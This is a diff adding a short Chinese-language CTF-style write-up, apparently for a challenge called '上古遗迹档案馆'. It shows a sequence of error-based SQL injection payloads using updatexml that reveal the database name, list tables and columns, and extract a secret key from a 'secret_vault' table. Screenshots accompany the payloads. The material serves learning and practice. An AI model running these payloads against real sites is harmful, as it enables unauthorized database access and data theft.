@@ -363,5 +363,29 @@ Go
 
 上古遗迹档案馆
 
-最近因为刚好在看SQL注入所以把这个也写一下，sqlmap我还没用过，感觉还没石粒，等我再熟悉熟悉之后再用，这里
+最近因为刚好在看SQL注入所以把这个也写一下，sqlmap我还没用过，感觉还没石粒，等我再熟悉熟悉之后再用，这里先测一下是字符型，采用报错注入：
+```SQL
+?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#
+```
+<img width="1306" height="407" alt="image" src="https://github.com/user-attachments/assets/dc182928-5279-430d-8989-b8e2621cc71d" />
+```SQL
+?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#
+```
+<img width="1310" height="426" alt="image" src="https://github.com/user-attachments/assets/f9782733-08e3-4041-957d-0e0551d70fc3" />
+```SQL
+?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='secret_vault')),1)#
+```
+<img width="1305" height="504" alt="image" src="https://github.com/user-attachments/assets/cbec9b9b-1c64-44d4-a55f-e3dbb9190720" />
+```SQL
+?id=1' and updatexml(1,concat(0x7e,(select substring(concat(secret_key) ,1,30) from secret_vault)),1)#
+```
+<img width="1375" height="480" alt="image" src="https://github.com/user-attachments/assets/26943a3e-20e8-4a40-9c3e-9c2d620fbb5e" />
+后面再改个位置就行，不再截了。
+
+
+
+
+
+
+
 
